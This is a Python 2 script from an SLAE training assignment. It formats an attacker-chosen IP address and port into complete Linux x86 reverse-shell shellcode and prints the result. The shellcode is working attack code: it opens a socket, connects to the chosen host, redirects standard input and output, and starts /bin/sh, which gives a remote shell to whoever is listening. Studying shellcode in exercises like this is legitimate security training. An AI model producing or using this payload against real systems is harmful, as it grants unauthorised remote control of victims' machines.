#!/usr/bin/python

# SLAE - Assignment 2 - TCP Reverse Bind Shell
# Python wrapper to change bind port in shellcode
# Author: Billy (@_hAxel)


import sys

if len(sys.argv) !=3:
	print "Incorrect usage. Use: python reversebindshellWrapper.py IP address port number."
	print "ex. python reversebindshellWrapper.py 192.168.1.1 1337"
	exit()
try:
	ip   = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "Incorrect usage. Use: python reversebindshellWrapper.py IP address port number."
        print "ex. python reversebindshellWrapper.py 192.168.1.1 1337"
	exit()
	
if port not in range(1025,65536):
	print ("Invalid port. Please select a port higher that 1024" +
	       "(due to root privileges needed) and lower than 65536(invalid port).")
	exit()

def toHex(n): # Function for converting values to hex and preparing for shellcode. 
	      # If I have time, I'll circle back and convert the work I did for the port
	hexVal = hex(int(n))[2:] # to use this funtion too. But in the mean time, i'd rather focus on the Assembly.
	if hexVal == "0":
		print "Sorry IP has null bytes, pick an IP that is not on a .0. subnet"
		exit()
	if len(hexVal) == 1:
        	hexVal = "0" + hexVal #Fill in placeholder zero is not present
	hexVal = "\\x" + hexVal	
	return hexVal 


addr = ""
for i in range(0,4):
	addr = addr + toHex(ip.split(".",3)[i])


portInHex = hex(port)[2:] #Convert port number to hex and strip off the 0x

if len(portInHex) < 4:
	portInHex = "0" + portInHex #Fill in placeholder zero is not present


if portInHex[0:2] == "00" or portInHex[2:4] == "00":
	print "The port number contains 00 (null bytes) and won't work for shell code."
	print "Currently, I'm to lazy too work around it, but maybe I will in a future revision."
	print "Please pick a different port."  #Time Permitting, I may look into adding a work around for null bytes
	exit()                		       #I should also probably loop back and ask for user input again instead of exiting


newPort = "\\x" + portInHex[0:2] + "\\x" + portInHex[2:4] #Format port number for shellcode

print "Creating TCP Reverse Bind shell Shellcode for linux x86 for " + str(ip) +" on port " + str(port)
print "IP formatted for the shellcode is " + str(addr)
print "Port number formatted for the shellcode is " + str(newPort)


shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xf6\\x31\\xff\\xb0\\x66\\xb3\\x01\\x56\\x53\\x6a\\x02\\x89" +
 "\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc0\\xb0\\x66\\x43\\x68" + addr + "\\x66\\x68" + newPort + 
 "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\x43\\xcd\\x80\\x31\\xc9\\xb1\\x02" +
 "\\x89\\xd3\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xd2" + 
 "\\x31\\xc9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80")

print "\nYour new shellcode is: \n\n\"" + shellcode + "\""
